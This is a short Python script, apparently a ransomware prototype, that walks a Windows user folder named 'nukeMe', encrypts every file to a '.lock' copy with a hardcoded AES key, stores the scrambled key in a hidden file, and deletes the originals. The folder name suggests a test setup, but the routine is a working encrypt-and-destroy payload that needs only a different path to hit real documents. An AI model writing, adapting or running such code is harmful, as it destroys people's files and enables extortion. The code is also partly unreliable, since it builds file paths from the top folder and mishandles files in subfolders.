from hidekey import scrmbl, dscrmbl

def encrypt():
    import pyAesCrypt
    import os

    # encryption/decryption buffer size - 64K
    bufferSize = 64 * 1024

    try:
        #print(1)
        key = "UorUJ2ivgwu2a8L7AWuB4nm6f2kXhy7C"
        with open(".key.txt", "w") as fileW:
            fileW.write(scrmbl(key))
        

    except:
        #Checking if it is already been executed
        #print("Already nuked")
        quit()

    # encryption
    def aesEncrypt():
        encryptThis = target     #target
        global encryptDone 
        encryptDone = str(encryptThis + ".lock")
        pyAesCrypt.encryptFile(encryptThis, encryptDone, key, bufferSize)


    def destroyOriginal():
    #removing the plain text key file immediately after usage
        if os.path.exists(target):
            os.remove(target)
        else:
            pass

    #Setting the target path "My Documents"
    targetPath = os.path.expanduser('~\\nukeMe')
    rootdir = os.path.expandvars(targetPath)

    #rootdir = "C:\Users\hp\nukeMe"

    #Encrypting files in My Documents WINDOWS
    for subdir, dirs, files in os.walk(rootdir):
        for file in files:
            try:
                target = rootdir + "\\" + str(file)
                #print(target)
                aesEncrypt()   
                destroyOriginal()
                #break
            except:
                pass



def main():
    encrypt()

if __name__ == "__main__":
    encrypt()
